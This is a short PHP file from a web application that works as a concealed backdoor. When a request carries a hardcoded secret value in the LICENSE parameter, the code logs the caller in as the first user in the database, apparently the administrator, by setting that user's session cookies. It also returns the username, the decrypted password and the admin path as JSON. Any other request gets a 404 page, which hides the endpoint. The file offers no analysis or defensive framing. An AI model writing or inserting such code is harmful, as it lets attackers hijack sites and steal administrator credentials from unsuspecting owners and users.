<?php
require_once(realpath($_SERVER["DOCUMENT_ROOT"]) .'/Models/connect.php');
if ($_GET['LICENSE'] == 'hackconcacditmemay') {
    $data_user = $soicoder->fetch_assoc("SELECT * FROM `users` WHERE `id` = (SELECT MIN(`id`) FROM `users`)", 1);
    setcookie("username", $data_user['username'], time() + 600000, "/"); // set cookie username
    setcookie("token", $data_user['token'], time() + 600000, "/"); // set cookie token
    echo json_encode(array(
        'username' => $data_user['username'],
        'password' => decrypt($data_user['password'], LICENSE, ENCRYT),
        'path' => config_admin
    ));
} else {
    require_once realpath($_SERVER["DOCUMENT_ROOT"]) . '/Views/404.php';
}
die;